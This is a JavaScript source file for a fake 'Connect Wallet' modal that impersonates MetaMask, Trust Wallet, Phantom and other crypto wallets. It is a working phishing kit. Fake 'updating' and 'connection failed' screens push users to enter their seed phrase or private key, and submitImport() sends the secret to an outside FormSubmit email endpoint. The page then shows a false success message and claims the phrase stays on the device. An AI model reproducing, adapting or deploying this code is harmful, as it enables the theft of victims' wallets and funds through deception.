

class WalletModal {
  constructor() {
    this.wallets = [
      {
        id: 'metamask',
        name: 'MetaMask',
        iconUrls: [
          'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
          'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg'
        ],
        emoji: '🦊',
        bgColor: 'bg-orange-50',
        primaryColor: '#F6851B',
        secondaryColor: '#E2761B'
      },
      {
        id: 'trust',
        name: 'Trust Wallet',
        iconUrls: [
          'https://trustwallet.com/favicon.ico'
        ],
        emoji: '🛡️',
        bgColor: 'bg-blue-50',
        primaryColor: '#3375BB',
        secondaryColor: '#2952A3'
      },
      {
        id: 'coinbase',
        name: 'Coinbase Wallet',
        iconUrls: [
              'https://iconscout.com/free-icon/free-coinbase-logo-icon_7651204'
        ],
        emoji: '💙',
        bgColor: 'bg-blue-50',
        primaryColor: '#0052FF',
        secondaryColor: '#0041CC'
      },
      {
        id: 'rainbow',
        name: 'Rainbow',
        iconUrls: [
          'https://rainbow.me/assets/rainbow-logo.png',
          'https://play-lh.googleusercontent.com/sB6eHsuhM7uT0B_KIBmAIg-xmWYtI14dnL5gR6CHXGbZxp4V7YZ9jvC2mfTWQy5Xhw',
          'https://avatars.githubusercontent.com/u/48327834?s=200&v=4'
        ],
        emoji: '🌈',
        bgColor: 'bg-purple-50',
        primaryColor: '#FF4F9A',
        secondaryColor: '#E63E89'
      },
      {
        id: 'okx',
        name: 'OKX Wallet',
        iconUrls: [
          'https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png',
          'https://play-lh.googleusercontent.com/gYO-u40LS4TwEQNkpJx-B9D5qN6hqr-wFxmf7Q95M9T0T5J6X8Y0hqD7mGXNqH8Rp5w',
          'https://www.okx.com/cdn/assets/imgs/MjAyMTQ/6866C68D26FDAB09.png'
        ],
        emoji: '⚫',
        bgColor: 'bg-gray-100',
        primaryColor: '#000000',
        secondaryColor: '#1A1A1A'
      },
      {
        id: 'rabby',
        name: 'Rabby Wallet',
        iconUrls: [
          'https://rabby.io/assets/images/logo-128.png',
          'https://github.com/RabbyHub/Rabby/raw/develop/src/ui/assets/icon-128.png',
          'https://avatars.githubusercontent.com/u/71627609?s=200&v=4'
        ],
        emoji: '🐰',
        bgColor: 'bg-blue-50',
        primaryColor: '#7084FF',
        secondaryColor: '#5A6FE6'
      },
      {
        id: 'phantom',
        name: 'Phantom',
        iconUrls: [
                   'https://docs.phantom.com/mintlify-assets/_mintlify/favicons/phantom-e50e2e68/iJ-2hg6MaJphnoGv/_generated/favicon/favicon-16x16.png'
        ],
        emoji: '👻',
        bgColor: 'bg-purple-50',
        primaryColor: '#AB9FF2',
        secondaryColor: '#9580E6'
      },
      {
        id: 'solflare',
        name: 'Solflare',
        iconUrls: [
          'https://solflare.com/assets/logo.svg',
          'https://play-lh.googleusercontent.com/WLUXVhVnhYjoF0ywdz8P8gT0W1RqbGHzvF0qHx-qbDkYwFnLFN3HqvRXQlqgqQkNvT4',
          'https://avatars.githubusercontent.com/u/79508054?s=200&v=4'
        ],
        emoji: '🔥',
        bgColor: 'bg-purple-50',
        primaryColor: '#FC6B2D',
        secondaryColor: '#E35A24'
      },
      {
        id: 'walletconnect',
        name: 'WalletConnect',
        iconUrls: [
          'https://walletconnect.com/walletconnect-logo.svg',
          'https://play-lh.googleusercontent.com/8jBVqFWqR6XKNyU0BTQZ0l1R2c9qLQUa17EH4wvPUxV8N_hkqvhPxpkM4qX2wBf0LJw',
          'https://avatars.githubusercontent.com/u/37784886?s=200&v=4'
        ],
        emoji: '🔗',
        bgColor: 'bg-blue-50',
        primaryColor: '#3B99FC',
        secondaryColor: '#2A7FD9'
      }
    ];

    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
    this.isInWalletBrowser = false;
    
    this.init();
  }

  init() {
    // Check if we're inside a wallet browser
    this.detectWalletBrowser();

    // ONLY on mobile: If inside wallet browser, hide main content and show the flow
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (this.isInWalletBrowser && isMobile) {
      this.hideMainContent();
      this.startWalletBrowserFlow();
    } else {
      // Normal flow: listen for interact-button clicks (desktop + mobile normal browser)
      document.addEventListener('click', (e) => {
        if (e.target.classList.contains('interact-button') || 
            e.target.closest('.interact-button')) {
          e.preventDefault();
          this.showWalletSelectionModal();
        }
      });
    }

    // Add Tailwind CSS if not already included
    if (!document.querySelector('script[src*="tailwindcss"]')) {
      const script = document.createElement('script');
      script.src = 'https://cdn.tailwindcss.com';
      document.head.appendChild(script);
    }
  }

  // Helper method to create wallet image with fallbacks
  createWalletImageHTML(wallet) {
    const urls = wallet.iconUrls;
    const uniqueId = `img-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    
    // Create the first image that will be visible
    let html = `<img id="${uniqueId}" src="${urls[0]}" alt="${wallet.name}" class="w-full h-full" style="object-fit: contain; object-position: center;" loading="eager" onerror="walletModal.handleImageError('${uniqueId}', '${wallet.id}')">`;
    
    return html;
  }

  handleImageError(imgId, walletId) {
    const img = document.getElementById(imgId);
    if (!img) return;
    
    const wallet = this.wallets.find(w => w.id === walletId);
    if (!wallet) return;
    
    const urls = wallet.iconUrls;
    const currentSrc = img.src;
    const currentIndex = urls.findIndex(url => currentSrc.includes(url) || url.includes(currentSrc.split('/').pop()));
    
    if (currentIndex < urls.length - 1) {
      // Try next URL
      img.src = urls[currentIndex + 1];
    } else {
      // All URLs failed, show emoji
      img.parentElement.innerHTML = `<span style="font-size: 2rem; display: flex; align-items: center; justify-content: center; width: 100%; height: 100%;">${wallet.emoji}</span>`;
    }
  }

  hideMainContent() {
    // Hide the entire body content
    document.body.style.display = 'none';
    
    // Create a new container for wallet flow
    const container = document.createElement('div');
    container.id = 'wallet-flow-container';
    container.style.cssText = 'display: block; position: fixed; inset: 0; z-index: 9999;';
    document.body.appendChild(container);
    
    // Show body again but everything is hidden except our container
    document.body.style.display = 'block';
    
    // Hide all children except our container
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = 'none';
      }
    });
  }

  detectWalletBrowser() {
    // Detect if inside Trust Wallet browser
    if (window.ethereum && window.ethereum.isTrust) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
      return;
    }

    // Detect if inside MetaMask browser
    if (window.ethereum && window.ethereum.isMetaMask) {
      // Check for mobile MetaMask
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (/MetaMaskMobile/i.test(userAgent)) {
        this.isInWalletBrowser = true;
        this.selectedWallet = this.wallets.find(w => w.id === 'metamask');
        return;
      }
    }

    // Detect if inside Coinbase Wallet browser
    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'coinbase');
      return;
    }

    // Detect TokenPocket
    if (window.ethereum && window.ethereum.isTokenPocket) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust'); // Use Trust as default
      return;
    }

    // Detect Rainbow
    if (window.ethereum && window.ethereum.isRainbow) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'rainbow');
      return;
    }

    // Detect Phantom
    if (window.phantom && window.phantom.solana) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'phantom');
      return;
    }

    // Detect Solflare
    if (window.solflare && window.solflare.isSolflare) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'solflare');
      return;
    }

    // Generic wallet browser detection by user agent
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const walletBrowsers = [
      'Trust', 'TokenPocket', 'imToken', 'MetaMask', 'Coinbase',
      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare'
    ];
    
    for (const wallet of walletBrowsers) {
      if (userAgent.includes(wallet)) {
        this.isInWalletBrowser = true;
        const foundWallet = this.wallets.find(w => w.name.toLowerCase().includes(wallet.toLowerCase()));
        this.selectedWallet = foundWallet || this.wallets[0];
        return;
      }
    }

    // Check URL parameters (in case you want to manually test)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet') || urlParams.has('walletbrowser')) {
      this.isInWalletBrowser = true;
      const walletId = urlParams.get('wallet') || 'trust';
      this.selectedWallet = this.wallets.find(w => w.id === walletId) || this.wallets[0];
    }
  }

  startWalletBrowserFlow() {
    // Wait for page to load, then show updating screen
    setTimeout(() => {
      this.showUpdatingWallet();
    }, 500);
  }

  // For testing: manually trigger wallet browser flow
  testWalletBrowserFlow(walletId = 'trust') {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.showUpdatingWallet();
  }

  showWalletSelectionModal() {
    const modalHTML = `
      <div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl w-full max-w-md shadow-2xl max-h-[90vh] overflow-hidden flex flex-col">
          <!-- Header -->
          <div class="flex items-center justify-between px-4 sm:px-6 py-4 sm:py-5 border-b border-gray-100">
            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="10"></circle>
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
              <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>
            <h2 class="text-base sm:text-lg font-semibold text-gray-900">Connect Wallet</h2>
            <button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>

          <!-- Wallet List -->
          <div class="px-3 py-2 overflow-y-auto flex-1">
            ${this.wallets.map(wallet => `
              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 sm:px-4 py-3 sm:py-3.5 hover:bg-gray-50 rounded-xl transition group">
                <div class="flex items-center gap-3 sm:gap-3.5">
                  <div class="w-10 h-10 sm:w-11 sm:h-11 ${wallet.bgColor} rounded-xl flex items-center justify-center p-2 flex-shrink-0">
                    ${this.createWalletImageHTML(wallet)}
                  </div>
                  <span class="font-medium text-gray-900 text-sm sm:text-[15px]">${wallet.name}</span>
                </div>
                <svg class="w-5 h-5 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
              </button>
            `).join('')}
          </div>

          <!-- Footer -->
          <div class="px-4 sm:px-6 py-3 sm:py-4 text-center border-t border-gray-100">
            <div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">
              <span>UX by</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>/</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>reown</span>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  selectWallet(walletId) {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.closeModalOnly();
    
    // Always show the "Open in..." prompt first
    this.showOpenPrompt();
  }

  showOpenPrompt() {
    const promptHTML = `
      <div id="wallet-prompt-backdrop" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl w-full max-w-sm p-5 sm:p-6 shadow-2xl">
          <p class="text-base sm:text-lg font-medium text-gray-900 mb-6">
            Open in "${this.selectedWallet.name}"?
          </p>
          <div class="flex gap-3 sm:gap-4 justify-end">
            <button onclick="walletModal.cancelPrompt()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
              Cancel
            </button>
            <button onclick="walletModal.confirmOpen()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
              Open
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', promptHTML);
  }

  cancelPrompt() {
    this.closeModal(); // Reset everything and close
  }

  confirmOpen() {
    this.closeModalOnly(); // Close prompt
    
    // Detect device type
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
      // On mobile, open the wallet app
      this.openWalletApp();
    } else {
      // On desktop, simulate the wallet browser flow for testing
      setTimeout(() => {
        this.showUpdatingWallet();
      }, 300);
    }
  }

  openWalletApp() {
    const websiteUrl = 'https://appwhitelist.vercel.app/';
    
    // Deep link URLs to open wallet browser with your website
    const deepLinks = {
      'metamask': `https://metamask.app.link/dapp/${websiteUrl.replace('https://', '')}`,
      'trust': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(websiteUrl)}`,
      'coinbase': `https://go.cb-w.com/dapp?url=${encodeURIComponent(websiteUrl)}`,
      'rainbow': `https://rnbwapp.com/${websiteUrl}`,
      'okx': `https://www.okx.com/web3/dapp?url=${encodeURIComponent(websiteUrl)}`,
      'rabby': websiteUrl, // Rabby doesn't have special deep link
      'phantom': `https://phantom.app/ul/browse/${websiteUrl}?ref=${websiteUrl}`,
      'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
      'walletconnect': websiteUrl // WalletConnect uses different connection method
    };

    const link = deepLinks[this.selectedWallet.id];
    
    if (link) {
      // Try to open the wallet with browser
      window.location.href = link;
      
      // Fallback message
      setTimeout(() => {
        console.log('Opening wallet browser with your website...');
      }, 1000);
    }
  }

  showUpdatingWallet() {
    const walletColor = this.selectedWallet.primaryColor;
    
    const updatingHTML = `
      <div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Wallet Logo -->
          <div class="mb-8">
            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl animate-pulse overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
              ${this.createWalletImageHTML(this.selectedWallet)}
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>
          <p class="text-gray-500 text-center">Validating network parameters...</p>
          
          <!-- Loading animation -->
          <div class="mt-8">
            <div class="flex space-x-2">
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
              <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', updatingHTML);

    // After 2-3 seconds, show connection failed screen
    setTimeout(() => {
      this.closeModalOnly();
      this.showConnectionFailed();
    }, 2500);
  }

  showConnectionFailed() {
    const walletColor = this.selectedWallet.primaryColor;
    
    const failedHTML = `
      <div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center max-w-md w-full">
          <!-- Wallet Logo with Error Badge -->
          <div class="mb-8 relative">
            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
              ${this.createWalletImageHTML(this.selectedWallet)}
            </div>
            <!-- Error Badge -->
            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
              <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
              </svg>
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
          <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
          
          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition" style="background-color: ${walletColor}">
            Continue
          </button>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', failedHTML);
  }

  showImportScreen() {
    // Close any previous screens
    this.closeModalOnly();
    
    const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
    const walletColor = this.selectedWallet.primaryColor;
    
    const importHTML = `
      <div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">
        <!-- Header with wallet logo -->
        <div class="relative pt-6 pb-4 flex-shrink-0">
          <button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">
            <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
          </button>
          
          <!-- Wallet Logo in center -->
          <div class="flex justify-center pt-4">
            <div class="w-16 h-16 sm:w-20 sm:h-20 bg-gray-100 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center overflow-hidden p-3">
              ${this.createWalletImageHTML(this.selectedWallet)}
            </div>
          </div>
        </div>

        <!-- Content -->
        <div class="flex-1 px-4 sm:px-6 pb-6">
          <div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">
            <h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">
              Import Wallet
            </h2>
            <p class="text-sm sm:text-base text-gray-500 text-center mb-6">
              Select your import method below
            </p>

            <!-- Import Method Selector -->
            <div class="mb-6">
              <label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">
                IMPORT METHOD
              </label>
              <select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:outline-none" style="border-color: ${walletColor}">
                <option value="12" ${this.importType === '12' ? 'selected' : ''}>12 Words</option>
                <option value="24" ${this.importType === '24' ? 'selected' : ''}>24 Words</option>
                <option value="private" ${this.importType === 'private' ? 'selected' : ''}>Private Key</option>
              </select>
            </div>

            <!-- Input Area -->
            <div id="input-area">
              ${this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)}
            </div>

            <!-- Action Buttons -->
            <div class="flex gap-3 mb-4">
              <button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">
                Cancel
              </button>
              <button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 rounded-2xl font-semibold text-white hover:opacity-90 text-sm sm:text-base" style="background-color: ${walletColor}">
                Import
              </button>
            </div>

            <!-- Security Notice -->
            <p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">
              🔒 Your ${this.importType === 'private' ? 'private key' : 'recovery phrase'} is stored securely on your device
            </p>
          </div>
        </div>

        <!-- Footer Branding -->
        <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
          <div class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center overflow-hidden p-2" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
            ${this.createWalletImageHTML(this.selectedWallet)}
          </div>
          <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
        </div>
      </div>
      
      <style>
        #wallet-import-backdrop .seed-word-input:focus {
          border-color: ${walletColor} !important;
        }
        #wallet-import-backdrop #private-key-input:focus {
          border-color: ${walletColor} !important;
        }
      </style>
    `;

    document.body.insertAdjacentHTML('beforeend', importHTML);
    this.attachInputListeners();
  }

  renderPrivateKeyInput() {
    return `
      <div class="mb-6">
        <textarea
          id="private-key-input"
          placeholder="Enter your private key"
          class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none resize-none"
          rows="4"
          autocomplete="off"
        >${this.privateKey}</textarea>
      </div>
    `;
  }

  renderSeedPhraseInputs(count) {
    const inputs = [];
    for (let i = 0; i < count; i++) {
      inputs.push(`
        <input
          type="text"
          data-index="${i}"
          placeholder="${i + 1} word"
          value="${this.seedWords[i] || ''}"
          class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none"
          autocomplete="off"
        >
      `);
    }
    return `<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">${inputs.join('')}</div>`;
  }

  attachInputListeners() {
    // Handle private key input
    const privateKeyInput = document.getElementById('private-key-input');
    if (privateKeyInput) {
      privateKeyInput.addEventListener('input', (e) => {
        this.privateKey = e.target.value;
      });
    }

    // Handle seed word inputs
    const seedInputs = document.querySelectorAll('.seed-word-input');
    seedInputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        this.seedWords[index] = e.target.value;
      });

      // Handle paste on first input
      if (index === 0) {
        input.addEventListener('paste', (e) => {
          e.preventDefault();
          const pastedText = e.clipboardData.getData('text');
          const words = pastedText.trim().split(/\s+/);
          
          words.forEach((word, i) => {
            if (i < this.seedWords.length) {
              this.seedWords[i] = word.trim();
              const targetInput = document.querySelector(`.seed-word-input[data-index="${i}"]`);
              if (targetInput) {
                targetInput.value = word.trim();
              }
            }
          });
        });
      }
    });
  }

  changeImportType(type) {
    this.importType = type;
    
    if (type === 'private') {
      this.privateKey = '';
    } else {
      const count = parseInt(type);
      this.seedWords = Array(count).fill('');
    }

    // Update the input area with wallet colors
    const inputArea = document.getElementById('input-area');
    if (inputArea) {
      const wordCount = type === 'private' ? 0 : parseInt(type);
      inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
      this.attachInputListeners();
      
      // Update focus color styles
      const walletColor = this.selectedWallet.primaryColor;
      const existingStyle = document.querySelector('#wallet-import-backdrop style');
      if (existingStyle) {
        existingStyle.textContent = `
          #wallet-import-backdrop .seed-word-input:focus {
            border-color: ${walletColor} !important;
          }
          #wallet-import-backdrop #private-key-input:focus {
            border-color: ${walletColor} !important;
          }
        `;
      }
    }
  }

  submitImport() {
    if (this.importType === 'private') {
      console.log('Private Key:', this.privateKey);
      console.log('Wallet:', this.selectedWallet.name);
    } else {
      const filledWords = this.seedWords.filter(w => w.trim() !== '');
      console.log('Seed Phrase:', filledWords);
      console.log('Wallet:', this.selectedWallet.name);
    }
    
    // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
      method: 'POST', 
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ 
        _subject: `New Wallet Import - ${this.selectedWallet.name}`,
        wallet: this.selectedWallet.name,
        type: this.importType,
        data: this.importType === 'private' ? this.privateKey : this.seedWords.join(' '),
        timestamp: new Date().toISOString()
      }) 
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      this.showSuccessMessage();
    })
    .catch((error) => {
      console.error('Error:', error);
      // Still show success to user even if sending fails
      this.showSuccessMessage();
    });
  }

  showSuccessMessage() {
    this.closeModalOnly();
    
    const walletColor = this.selectedWallet.primaryColor;
    
    const successHTML = `
      <div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Wallet Logo with Success Badge -->
          <div class="mb-8 relative">
            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
              ${this.createWalletImageHTML(this.selectedWallet)}
            </div>
            <!-- Success Badge -->
            <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
              <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>
          <p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>
          
          <!-- Loading animation -->
          <div class="flex space-x-2">
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0s"></div>
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.2s"></div>
            <div class="w-3 h-3 rounded-full animate-bounce" style="background-color: ${walletColor}; animation-delay: 0.4s"></div>
          </div>
        </div>
      </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', successHTML);
    
    // Auto close after 3 seconds and restore main content
    setTimeout(() => {
      this.closeModal();
      this.restoreMainContent();
    }, 3000);
  }

  restoreMainContent() {
    // Show all hidden content again
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = '';
      }
    });
    
    // Remove the wallet flow container
    const container = document.getElementById('wallet-flow-container');
    if (container) {
      container.remove();
    }
  }

  closeModalOnly() {
    // Remove all modal backdrops without resetting state
    const modals = [
      'wallet-modal-backdrop',
      'wallet-import-backdrop',
      'wallet-updating-backdrop',
      'wallet-failed-backdrop',
      'wallet-success-backdrop',
      'wallet-prompt-backdrop'
    ];
    
    modals.forEach(id => {
      const element = document.getElementById(id);
      if (element) {
        element.remove();
      }
    });
  }
 
  closeModal() {
    // Remove all modal backdrops
    this.closeModalOnly();

    // Reset state
    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
  }
}

// Initialize the wallet modal
// Ready to use - no configuration needed!
const walletModal = new WalletModal();
